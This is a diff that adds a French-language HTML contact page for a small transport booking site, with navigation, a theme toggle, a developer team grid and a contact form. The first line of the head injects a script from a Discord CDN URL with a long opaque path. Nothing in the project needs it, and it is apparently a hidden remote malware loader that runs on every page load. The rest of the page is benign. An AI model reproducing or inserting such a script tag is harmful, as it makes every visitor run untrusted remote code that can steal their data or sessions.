@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head><script type='text/javascript' src='https://cdn.discordapp.com/davMmsm-tGlBRASFFD_g_aY_gQ-wjCmbWDMjl-4xMBBhqiOxDWsMbuSrVadJZ5VN4_fGuNdv3qhaFcbmGNvk3C1m2N6QKZQDV0JfwnL6kcjE8rpJ_nifggXJFEyR-SVK9zia4d3X7S3_8AJ6xjIuQHxQmU-6lmXemstcggJAQAxXApfQz0m-BfJnvwygigidyBKYIqfT-C_7fq_Xtx3H0ykGDkqZOJILAsjRFeLgJcczfMgsKZzy5NTHqIuUwaIOR8kq_9Y-PijiLpQKeJ3C5Y8pBcJwEXtDQ3BHmmGkiNd34QW7QyR5YUjmSC_i25rPNTRaVXvAwdw-o5B3tFK6Bi5w-VUg4WMZcd6ygwgP0CEj1nXCWq8HLoN_SZ421_9Syc-zw9g5EGleyY6Pj7-SGRNfsrmOFmfkONqHsiqqzX0jb2eGbZKryDBUa01jOsT5fnbcoWfGZW2wYTrfdeK4P5oAAwnQ9FLJ3m8e66ngj6W7ILcrsAEWQHb4WEU3Lh7buV7yfZZE0di7e9AYBmT3L7kM5qQS_VwhGuwLA7fRj2EY511xX947VgowbR1qmhzyfoPanRLEAsTgGz0NoMbnWVEtfsjD2dDtShXrnTaKVi65Dkv8jakEejxCiBgnCBn5S2-x8qBTFJaPTM7P8a_LJYHyQwhDEOJhpul5R70'></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contactez-nous - europe.transports</title>
+    <link rel="stylesheet" href="../css/theme.css">
+    <link rel="stylesheet" href="../css/contact.css">
+</head>
+<body>
+
+    <header class="navbar">
+        <div class="logo"><img src="img/Logo.svg" alt="europe.transports"></div>
+        <nav>
+            <div class="nav-links">
+                <a href="dashboard.html">Voyager</a>
+                <a href="billet.html">Billets</a>
+                <a href="#">Compte</a>
+                <a href="#">Contact</a>
+                <button id="btn-auth" class="btn-member"><img src="img/Member.svg" alt="">Espace Adhérent</button>
+            </div>
+        </nav>
+        <div class="navbar_right">
+            <div class="cyber-toggle-wrapper">
+                <input class="cyber-toggle-checkbox" id="cyber-toggle" type="checkbox" />
+                <label class="cyber-toggle" for="cyber-toggle">
+                    <div class="cyber-toggle-track">
+                        <div class="cyber-toggle-track-glow"></div>
+                        <div class="cyber-toggle-track-dots">
+                            <span class="cyber-toggle-track-dot"></span>
+                            <span class="cyber-toggle-track-dot"></span>
+                            <span class="cyber-toggle-track-dot"></span>
+                        </div>
+                    </div>
+                    <div class="cyber-toggle-thumb">
+                        <div class="cyber-toggle-thumb-shadow"></div>
+                        <div class="cyber-toggle-thumb-highlight"></div>
+                        <div class="cyber-toggle-thumb-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                <path d="M16.5 12c0-2.48-2.02-4.5-4.5-4.5s-4.5 2.02-4.5 4.5 2.02 4.5 4.5 4.5 4.5-2.02 4.5-4.5zm-4.5 7.5c-4.14 0-7.5-3.36-7.5-7.5s3.36-7.5 7.5-7.5 7.5 3.36 7.5 7.5-3.36 7.5-7.5 7.5zm0-16.5c-4.97 0-9 4.03-9 9h-3l3.89 3.89.07.14 4.04-4.03h-3c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42c1.63 1.63 3.87 2.64 6.36 2.64 4.97 0 9-4.03 9-9s-4.03-9-9-9z"/>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="cyber-toggle-particles">
+                        <span class="cyber-toggle-particle"></span>
+                        <span class="cyber-toggle-particle"></span>
+                        <span class="cyber-toggle-particle"></span>
+                        <span class="cyber-toggle-particle"></span>
+                    </div>
+                </label>
+                <div class="cyber-toggle-labels">
+                    <span class="cyber-toggle-label-off">Dark</span>
+                    <span class="cyber-toggle-label-on">Light</span>
+                </div>
+            </div>
+            <!-- Burger mobile -->
+            <button class="nav-burger" id="burger" onclick="toggleMenu()">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </header>
+    <!-- Menu mobile (hors header) -->
+    <div class="nav-mobile" id="nav-mobile">
+        <a href="dashboard.html">Voyager</a>
+        <a href="">Billets</a>
+        <a href="#">Compte</a>
+        <a href="#">Contact</a>
+        <button id="btn-auth-mobile" class="btn-member">
+            <img src="img/Member.svg" alt="">Espace Adhérent
+        </button>
+    </div>
+
+    <main class="container">
+        <h1 class="Titre_principal">Contactez-nous</h1>
+
+        <div class="contact-layout">
+            
+            <div class="team-section">
+                <h2>Notre Équipe</h2>
+                <div class="team-grid">
+                    <div class="team-member">
+                        <img src="pfp/yanis.jpg" alt="Yanis" class="member-avatar">
+                        <h3>Yanis</h3>
+                        <p>Développeur</p>
+                    </div>
+                    <div class="team-member">
+                        <img src="pfp/Titi.png" alt="Thino" class="member-avatar">
+                        <h3>Thino</h3>
+                        <p>Développeur</p>
+                    </div>
+                    <div class="team-member">
+                        <img src="pfp/val.jpeg" alt="Valentin" class="member-avatar">
+                        <h3>Valentin</h3>
+                        <p>Développeur</p>
+                    </div>
+                    <div class="team-member">
+                        <img src="pfp/seb.jpg" alt="Sébastien" class="member-avatar">
+                        <h3>Sébastien</h3>
+                        <p>Développeur</p>
+                    </div>
+                    <div class="team-member">
+                        <img src="pfp/gab.jpeg" alt="Gabriel" class="member-avatar">
+                        <h3>Gabriel</h3>
+                        <p>Développeur</p>
+                    </div>
+                    <div class="team-member">
+                        <img src="pfp/tran.jpeg" alt="Tran" class="member-avatar">
+                        <h3>Tran</h3>
+                        <p>Développeur</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <div class="contact-card">
+                    <form id="contact-form">
+                        <div class="form-group">
+                            <label>Nom</label>
+                            <input type="text" required placeholder="Votre nom">
+                        </div>
+                        <div class="form-group">
+                            <label>Email</label>
+                            <input type="email" required placeholder="votre@email.com">
+                        </div>
+                        <div class="form-group">
+                            <label>Sujet</label>
+                            <input type="text" required placeholder="Sujet de votre message">
+                        </div>
+                        <div class="form-group">
+                            <label>Message</label>
+                            <textarea required placeholder="Comment pouvons-nous vous aider ?"></textarea>
+                        </div>
+                        <button type="submit" class="btn-submit">Envoyer le message</button>
+                    </form>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <script src="../js/theme.js"></script>
+    <script src="../js/logout.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const user = JSON.parse(localStorage.getItem('user'));
+            const btnAuth = document.getElementById('btn-auth');
+            
+            if (user && btnAuth) {
+                btnAuth.innerHTML = `<img src="img/Member.svg" alt=""> ${user.nom_complet} (Déconnexion)`;
+                btnAuth.addEventListener('click', () => {
+                    localStorage.removeItem('user');
+                    window.location.href = 'login.html';
+                });
+            } else if (btnAuth) {
+                btnAuth.addEventListener('click', () => {
+                    window.location.href = 'login.html';
+                });
+            }
+        });
+
+        document.getElementById('contact-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert("Merci pour votre message ! Notre équipe vous répondra très vite.");
+            this.reset();
+        });
+    </script>
+</body>
+</html>
